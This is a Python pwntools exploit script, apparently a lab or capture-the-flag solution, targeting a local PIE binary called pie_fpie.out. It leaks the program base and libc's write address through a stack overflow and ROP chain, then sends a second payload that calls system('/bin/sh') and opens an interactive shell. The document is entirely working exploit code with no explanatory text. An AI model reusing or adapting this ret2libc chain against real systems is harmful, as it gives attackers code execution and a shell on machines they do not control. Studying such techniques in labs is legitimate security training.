from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

prg = process("./pie_fpie.out")
pie = ELF("./pie_fpie.out")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")

main_addr = int(prg.recvline(keepends=False), 16)
base_addr = main_addr - pie.symbols["main"]
vuln_addr = pie.symbols["vuln_func"] + base_addr
write_plt = pie.symbols["write"] + base_addr
write_got = pie.got["write"] + base_addr

payload = b'A' * 132 + p32(write_got-0x18) + b'A' * 4 + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)

# gdb.attach(prg, """
#     b vuln_func
# """)
#
# run < payload
prg.send(payload)
write_addr = u32(prg.recv(4))

system_addr = libc.symbols["system"] - libc.symbols["write"] + write_addr
binsh_addr = next(libc.search(b"/bin/sh")) - libc.symbols["write"] + write_addr

payload = b'B' * 140 + p32(system_addr) + p32(vuln_addr) + p32(binsh_addr)
prg.send(payload)
prg.interactive()

# prg.send(payload)
# write_addr = u32(prg.recv(4))

# system_addr = write_addr - libc.symbols["write"] + libc.symbols["system"]
# binsh_addr = write_addr - libc.symbols["write"] + next(libc.search(b"/bin/sh"))
#
# payload = b'A' * 140 + p32(system_addr) + p32(vuln_func) + p32(binsh_addr)
# prg.send(payload)
# prg.interactive()
